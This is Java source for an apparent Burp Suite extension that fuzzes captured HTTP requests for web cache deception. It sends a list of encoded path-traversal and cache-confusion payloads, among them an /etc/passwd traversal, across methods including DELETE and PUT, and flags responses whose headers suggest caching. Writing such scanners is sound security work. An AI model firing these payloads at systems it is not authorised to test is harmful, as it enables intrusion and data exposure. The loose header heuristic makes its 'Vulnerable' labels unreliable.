package wcdscanner;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.HttpService;
import burp.api.montoya.http.message.HttpHeader;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;
import burp.api.montoya.persistence.PersistedObject;
import burp.api.montoya.core.ByteArray;
import burp.api.montoya.logging.Logging;
import javax.swing.*;
import java.awt.Color;
import java.awt.Component;
import java.net.URI;
import java.text.SimpleDateFormat;
import java.time.ZonedDateTime;
import java.time.format.DateTimeFormatter;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.ExecutorService;

public class PacketProcessor {
    private final MontoyaApi api;
    private final ExecutorService executorService;
    private final PersistedObject extensionData;
    private final DomainTreeManager domainTreeManager;
    private final FilterManager filterManager;
    private final UIComponents uiComponents;
    private final Map<String, String> payloadMap = new HashMap<>();
    private static final String[] PAYLOADS = {
            ".js", ".css", "/1.css", "/foo.js?foo.png", "/;.js", "/min.js", "/robots.txt", "%2Fxyz.js",
            "?_debug=1.css", "/../style.css", "/%20test.css", "?cb=main.js", "/js/tracking.js", ";test.png",
            ";abcd.js", "/wcd.js", "%2ftest%3fabcd.js", "/%2ftest%3fmain.js", ".html", ".php",
            ";%23%2f%2e%2e%2fresources?wcd", "/../../test.js", "/../test.js", ";%2f%2e%2e%2frobots.txt?wcd",
            "%2f%2e%2e%2fmain.js?id", "%3c%2fscript%3e?main.js", "?file=../../../../etc/passwd.css",
            "%253c%252fscript%253e?main.js", "#test.js", ".svg", ".asp", ".aspx", "/backup.bak",
            "/script%2ejson", "/test%2epdf", "/%2e%2e%2fconfig.xml", "?debug=style%2ecss", "/%5cassets.woff",
            "/%2f%2e%2e%2fdata.json?id", "/icon.ico", ";image%2ejpg", "/%20prod%2etxt", "/api%2ephp",
            "%2ftest%2easp?cb=1", "/%2e%2e%2fbackup%2ezip", "/fonts%2ewoff2", "?file=../../config%2etmp",
            "/%26script%2ejs", ";%23%2f%2e%2e%2fdata.csv?wcd", "/test%2emp4", "/%2f%2e%2e%2farchive.tar.gz?id",
            "%3c%2fscript%3e?tracking.js", "/%09style%2ecss", "/%00test%2epng", "/assets%2efake.js",
            "#config.json", "/%2f%2e%2e%2fresources%2eatom", "?v=prod%2ewoff", "/%5ctest%2e7z",
            "/resource/../../../MainPath/;.js", "/resources/..%2fMainPath?wcd", "/js/../../MainPath?abcd.css",
            "/resource/_/../../MainPath/js;main.js", "/resources/..%2fMainPath", "/resources/..%2f..%2fMainPath",
            "/resources/%2e%2e%2fMainPath", "/resources/%2e%2e/MainPath", "/resources/%2e%2e//MainPath",
            "/resources/..%252fMainPath", "/resources/..%c0%afMainPath", "/resources/..%5cMainPath",
            "/resources/%2e%2e\\MainPath", "/resources/..;/MainPath", "/resources/.%2e/MainPath",
            "/resources/%252e%252e%252fMainPath", "/resources/%ef%bc%8f../MainPath", "/resources/MainPath%00.js",
            "/resources/MainPath.js?", "/resources/MainPath.js?fake=1", "/resources/MainPath.js#.",
            "/resources/MainPath.js/.", "/resources/.js/../MainPath", "/resources/.css/../MainPath",
            "/static/..%2fMainPath", "/static/%2e%2e/%2e%2e/MainPath", "/static/..;/MainPath",
            "/static/..%2f..%2fMainPath", "/static/..%5c..%5cMainPath", "/static/%2e%2e%5cMainPath",
            "/assets/..%2fMainPath", "/assets/%2e%2e/%2e%2e/MainPath", "/assets/..;/MainPath",
            "/assets/..%5cMainPath", "/assets/%2e%2e%2fMainPath.js", "/assets/.js/../MainPath",
            "/assets/..%2fMainPath?cache=1", "/public/..%2fMainPath", "/public/%2e%2e/%2e%2e/MainPath",
            "/public/..;/MainPath", "/public/.js/../MainPath", "/public/..%2fMainPath.js",
            "/cdn/..%2fMainPath", "/cdn/%2e%2e/%2e%2e/MainPath", "/cdn/..;/MainPath",
            "/cdn/.js/../MainPath", "/cdn/..%2fMainPath?file=main.js", "/resources/%2e%2e/%2e%2e/%2e%2e/MainPath",
            "/resources/..%2f..%2f..%2fMainPath", "/resources///../MainPath", "/resources/..//MainPath",
            "/resources/%2e%2e/./MainPath", "/resources/%2e%2e%2f./MainPath", "/resources/%2e%2e%2fMainPath?wcd",
            "/resources/%2e%2e%2fMainPath?static=true", "/resources/%2e%2e%2fMainPath&forcecache=1",
            "/resources/%2e%2e%2fMainPath#static", "/resources/%2e%2e%2fMainPath.js&nocache=false",
            "/resources/%2e%2e%2fMainPath.js?v=9999", "/resources/%2e%2e%2fMainPath.css",
            "/resources/%2e%2e%2fMainPath.png", "/resources/%2e%2e%2fMainPath.jpg",
            "/resources/%2e%2e%2fMainPath.svg", "/resources/%2e%2e%2fMainPath.txt",
            "/static/../MainPath", "/assets/../MainPath", "/public/../MainPath", "/cdn/../MainPath"
    };

    public PacketProcessor(MontoyaApi api, ExecutorService executorService, PersistedObject extensionData,
                           DomainTreeManager domainTreeManager, FilterManager filterManager, UIComponents uiComponents) {
        this.api = api;
        this.executorService = executorService;
        this.extensionData = extensionData;
        this.domainTreeManager = domainTreeManager;
        this.filterManager = filterManager;
        this.uiComponents = uiComponents;
    }

    public void addPacket(HttpRequestResponse requestResponse) {
        setTabColor(Color.ORANGE);
        Logging logging = api.logging();
        HttpRequest originalRequest = requestResponse.request();
        String urlStr = originalRequest.url().toString();
        String host = urlStr.contains("://") ? urlStr.split("/")[2].split(":")[0] : "N/A";
        String domain = domainTreeManager.extractBaseDomain(host);
        String tempFullHost = host;

        try {
            URI uri = URI.create(originalRequest.url().toString());
            String actualHost = uri.toURL().getHost();
            if (actualHost != null && !actualHost.isEmpty()) {
                tempFullHost = actualHost;
            }
            domainTreeManager.addDomain(domain, tempFullHost);
        } catch (Exception e) {
            api.logging().logToError("✘ URL parse error: " + originalRequest.url().toString());
        }

        final String finalFullHost = tempFullHost;
        SwingUtilities.invokeLater(() -> domainTreeManager.refreshDomainTree(uiComponents.getDomainTree()));

        byte[] originalBytes = originalRequest.toByteArray().getBytes();
        String requestFullStr = new String(originalBytes);
        String originalPath = originalRequest.path();

        logging.logToOutput(requestFullStr);

        executorService.submit(() -> {
            Logging threadLogging = api.logging();
            threadLogging.logToOutput("[Thread] Starting fuzzing process for domain: " + domain);

            if (api.http() == null) {
                threadLogging.logToError("[Thread] Error: HTTP service is null!");
                return;
            }

            HttpService httpService = originalRequest.httpService();
            if (httpService == null) {
                threadLogging.logToError("[Thread] Error: httpService is null!");
                return;
            }

            threadLogging.logToOutput("[Thread] HTTP service is available.");

            String requestLine = requestFullStr.substring(0, requestFullStr.indexOf("\r\n"));
            String restOfRequest = requestFullStr.substring(requestFullStr.indexOf("\r\n"));
            String[] requestLineParts = requestLine.split(" ", 3);
            String httpVersion = requestLineParts.length > 2 ? requestLineParts[2] : "HTTP/1.1";

            String[] methods = {"GET", "POST", "PUT", "DELETE", "HEAD", "OPTIONS", "PATCH", "TRACE"};
            boolean[] methodEnabled = {
                    filterManager.getGetMethod(), filterManager.getPostMethod(), filterManager.getPutMethod(),
                    filterManager.getDeleteMethod(), filterManager.getHeadMethod(), filterManager.getOptionsMethod(),
                    filterManager.getPatchMethod(), filterManager.getTraceMethod()
            };

            SimpleDateFormat sdf = new SimpleDateFormat("HH:mm:ss.SSS");

            for (int i = 0; i < methods.length; i++) {
                final int finalI = i;
                if (methodEnabled[finalI]) {
                    for (String payload : PAYLOADS) {
                        String newPath = payload.contains("MainPath") ?
                                payload.replace("MainPath", originalPath.startsWith("/") ? originalPath.substring(1) : originalPath) :
                                originalPath + payload;
                        String newRequestLine = methods[finalI] + " " + newPath + " " + httpVersion;
                        String fullFuzzedRequest = newRequestLine + restOfRequest;

                        threadLogging.logToOutput(fullFuzzedRequest);

                        try {
                            HttpRequest fuzzedRequest = HttpRequest.httpRequest(httpService, ByteArray.byteArray(fullFuzzedRequest.getBytes()));
                            HttpRequestResponse fuzzedResponse = api.http().sendRequest(fuzzedRequest);

                            if (fuzzedResponse != null && fuzzedResponse.response() != null) {
                                String responseStr = new String(fuzzedResponse.response().toByteArray().getBytes());
                                threadLogging.logToOutput(responseStr);

                                String uniqueKey = fuzzedRequest.url().toString() + "#" + methods[finalI] + "#" + payload;
                                payloadMap.put(uniqueKey, payload);

                                String storageKey = "packet_" + System.nanoTime() + "_" + finalI + "_" + payload.hashCode();
                                extensionData.setByteArray(storageKey + "_request", fuzzedResponse.request().toByteArray());
                                extensionData.setByteArray(storageKey + "_response", fuzzedResponse.response().toByteArray());

                                String time = sdf.format(new Date(System.currentTimeMillis()));
                                String effectivePayload = calculateEffectivePayload(originalPath, fuzzedRequest.path(), payload);
                                int statusCode = fuzzedResponse.response().statusCode();
                                int length = fuzzedResponse.response().body().length();
                                String vulnerabilityStatus = getVulnerabilityStatus(fuzzedResponse.response(), statusCode);

                                PacketInfo packetInfo = new PacketInfo(
                                        fuzzedRequest.url().toString(),
                                        methods[finalI],
                                        payload,
                                        originalPath,
                                        statusCode,
                                        length,
                                        time,
                                        vulnerabilityStatus,
                                        storageKey
                                );

                                SwingUtilities.invokeLater(() -> {
                                    domainTreeManager.addPacket(finalFullHost, packetInfo);
                                    if (finalFullHost.equals(uiComponents.getLastSelectedDomain())) {
                                        uiComponents.updateLogTable(packetInfo);
                                        int row = uiComponents.getLogModel().getRowCount() - 1;
                                        if (row >= 0) {
                                            uiComponents.getLogTable().setRowSelectionInterval(row, row);
                                            // Assuming showPacketDetails is handled in UIComponents
                                        }
                                    }
                                });
                            } else {
                                threadLogging.logToError("✘ No response received for request: " + methods[finalI] + " " + newPath);
                            }
                        } catch (Exception e) {
                            threadLogging.logToError("✘ Error sending request: " + e.getMessage() +
                                    " - Stack trace: " + java.util.Arrays.toString(e.getStackTrace()));
                        }
                    }
                }
            }

            threadLogging.logToOutput("[Thread] Fuzzing process completed for domain: " + domain);
        });
    }

    private void setTabColor(Color color) {
        SwingUtilities.invokeLater(() -> {
            Component parent = uiComponents.getMainPanel().getParent();
            if (parent instanceof JTabbedPane) {
                JTabbedPane tabbedPane = (JTabbedPane) parent;
                int tabIndex = -1;
                for (int i = 0; i < tabbedPane.getTabCount(); i++) {
                    if (tabbedPane.getComponentAt(i) == uiComponents.getMainPanel()) {
                        tabIndex = i;
                        break;
                    }
                }
                if (tabIndex != -1) {
                    final int finalTabIndex = tabIndex;
                    tabbedPane.setBackgroundAt(finalTabIndex, color);
                    Timer timer = new Timer();
                    timer.schedule(new TimerTask() {
                        @Override
                        public void run() {
                            SwingUtilities.invokeLater(() -> tabbedPane.setBackgroundAt(finalTabIndex, null));
                        }
                    }, 3000);
                }
            }
        });
    }

    private String calculateEffectivePayload(String originalPath, String testPath, String defaultPayload) {
        if (testPath != null && originalPath != null && testPath.startsWith(originalPath)) {
            String effectivePayload = testPath.substring(originalPath.length());
            return effectivePayload.isEmpty() ? defaultPayload : effectivePayload;
        }
        return defaultPayload;
    }


    private String getVulnerabilityStatus(HttpResponse response, int statusCode) {
        if (response == null) {
            return "Not vulnerable (no response)";
        }

        // Focus on GET/HEAD/200 by default
        if (statusCode != 200) {
            return "Not vulnerable";
        }

        List<HttpHeader> headers = response.headers();
        boolean hasNoStore = false;
        boolean hasNoCache = false;
        boolean hasPrivate = false;
        boolean hasSetCookie = false;
        boolean varyStar = false;

        // Caching indicators
        boolean hasCaching = false;
        String cachingReason = "";

        for (HttpHeader header : headers) {
            String name = header.name();
            String value = header.value();
            if (name == null || value == null) continue;
            String lname = name.trim().toLowerCase();
            String lvalue = value.trim().toLowerCase();

            switch (lname) {
                case "cache-control": {
                    String[] directives = lvalue.split(",");
                    for (String rawDir : directives) {
                        String dir = rawDir.trim();
                        if (dir.isEmpty()) continue;

                        int eq = dir.indexOf('=');
                        String key = (eq > 0) ? dir.substring(0, eq).trim() : dir;
                        String val = (eq > 0) ? dir.substring(eq + 1).trim() : null;

                        switch (key) {
                            case "no-store":
                                hasNoStore = true;
                                break;
                            case "private":
                                hasPrivate = true;
                                break;
                            case "no-cache":
                                hasNoCache = true;
                                break;
                            case "public":
                                hasCaching = true;
                                cachingReason = "Cache-Control: public";
                                break;
                            case "max-age":
                                if (val != null) {
                                    try {
                                        int v = Integer.parseInt(val.replaceAll("[^0-9]", ""));
                                        if (v > 0) {
                                            hasCaching = true;
                                            cachingReason = "Cache-Control: max-age=" + v;
                                        }
                                    } catch (NumberFormatException ignored) {}
                                }
                                break;
                            case "s-maxage":
                                if (val != null) {
                                    try {
                                        int v = Integer.parseInt(val.replaceAll("[^0-9]", ""));
                                        if (v > 0) {
                                            hasCaching = true;
                                            cachingReason = "Cache-Control: s-maxage=" + v;
                                        }
                                    } catch (NumberFormatException ignored) {}
                                }
                                break;
                            case "immutable":
                            case "stale-while-revalidate":
                            case "stale-if-error":
                                hasCaching = true;
                                cachingReason = "Cache-Control: " + key;
                                break;
                            default:
                                break;
                        }
                    }
                    break;
                }

                case "expires": {
                    try {
                        ZonedDateTime expiresDate = ZonedDateTime.parse(value, DateTimeFormatter.RFC_1123_DATE_TIME);
                        if (expiresDate.isAfter(ZonedDateTime.now())) {
                            hasCaching = true;
                            cachingReason = "Expires: future date";
                        }
                    } catch (Exception ignored) {}
                    break;
                }

                case "age": {
                    try {
                        int age = Integer.parseInt(lvalue.replaceAll("[^0-9]", ""));
                        if (age > 0) {
                            hasCaching = true;
                            cachingReason = "Age: " + age;
                        }
                    } catch (NumberFormatException ignored) {}
                    break;
                }

                case "cache-status":
                case "x-cache":
                case "x-cache-lookup":
                case "cf-cache-status":
                case "x-proxy-cache":
                case "x-hit-cache": {  // Added: non-standard proxy
                    if (lvalue.contains("hit")) {
                        hasCaching = true;
                        cachingReason = lname + ": hit";
                    }
                    break;
                }

                case "fastly-cache": {
                    if (lvalue.contains("hit")) {
                        hasCaching = true;
                        cachingReason = "Fastly-Cache: hit";
                    }
                    break;
                }

                case "x-served-by": {
                    if (lvalue.contains("cache")) {
                        hasCaching = true;
                        cachingReason = "X-Served-By: contains cache";
                    }
                    break;
                }

                case "etag":
                case "last-modified": {
                    if (!lvalue.isEmpty()) {
                        hasCaching = true;
                        cachingReason = lname + ": present";
                    }
                    break;
                }

                case "vary": {
                    if (lvalue.equals("*")) {
                        varyStar = true;
                    }
                    break;
                }

                case "pragma": {
                    if (lvalue.contains("no-cache")) {
                        hasNoCache = true;
                    }
                    break;
                }

                case "set-cookie": {
                    if (!lvalue.isEmpty()) {
                        hasSetCookie = true;
                    }
                    break;
                }

                case "surrogate-control":
                case "edge-control": {
                    if (lvalue.contains("max-age") || lvalue.contains("s-maxage")) {
                        hasCaching = true;
                        cachingReason = lname + ": max-age/s-maxage";
                    }
                    if (lvalue.contains("no-store")) {
                        hasNoStore = true;
                    }
                    break;
                }

                case "x-cache-key": {
                    if (!lvalue.isEmpty()) {
                        hasCaching = true;
                        cachingReason = "X-Cache-Key: present";
                    }
                    break;
                }

                case "via": {  // Added: proxy/CDN indicator
                    if (lvalue.contains("cache") || lvalue.contains("cloudflare") || lvalue.contains("akamai") || lvalue.contains("fastly")) {
                        hasCaching = true;
                        cachingReason = "Via: cache/CDN indicator";
                    }
                    break;
                }

                default:
                    break;
            }
        }

        // High-priority blockers: if any true -> Not vulnerable
        if (hasNoStore || hasPrivate || hasNoCache || varyStar || hasSetCookie) {
            return "Not vulnerable";
        }

        // Any caching indicator -> Vulnerable
        if (hasCaching) {
            return "Vulnerable packet";
        }

        return "Not vulnerable";
    }
}
